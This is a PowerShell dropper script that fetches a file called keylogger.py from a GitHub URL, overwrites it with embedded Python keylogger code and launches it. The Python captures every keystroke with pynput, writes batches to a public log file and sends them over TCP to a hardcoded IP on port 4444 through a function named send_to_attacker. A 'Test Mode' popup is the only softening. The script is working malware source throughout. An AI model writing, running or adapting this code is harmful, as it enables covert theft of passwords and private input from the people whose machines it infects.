# Set correct download URL (replace with your actual file path)
$downloadUrl = "https://github.com/ndnik/ndnik/raw/refs/heads/main/keylogger.py"
$tempPath = "$env:TEMP\keylogger.py"

# Download keylogger.py
Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing
Write-Host "✅ Downloaded: $tempPath"

# Define popup and logging-enabled Python code
$popupCode = @'
import ctypes
import pynput.keyboard
import socket
import threading
import os

# Popup for visible confirmation
ctypes.windll.user32.MessageBoxW(0, "✅ Keylogger Started Successfully", "Test Mode", 1)

IP = "192.168.0.106"
PORT = 4444
log = ""

def send_to_attacker(message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send(message.encode())
        s.close()
    except:
        pass

def process_key(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "
    if len(log) >= 10:
        with open("C:\\Users\\Public\\log.txt", "a") as f:
            f.write(log + "\\n")
        send_to_attacker(log)
        log = ""

def start_logger():
    with pynput.keyboard.Listener(on_press=process_key) as listener:
        listener.join()

threading.Thread(target=start_logger).start()
'@

# Overwrite keylogger.py with popup-injected version
$popupCode | Out-File -FilePath $tempPath -Encoding ASCII
Write-Host "✅ Code with popup written to $tempPath"

# Execute with Python
Start-Process -NoNewWindow -FilePath "python" -ArgumentList "`"$tempPath`""
Write-Host "✅ Executed: $tempPath"
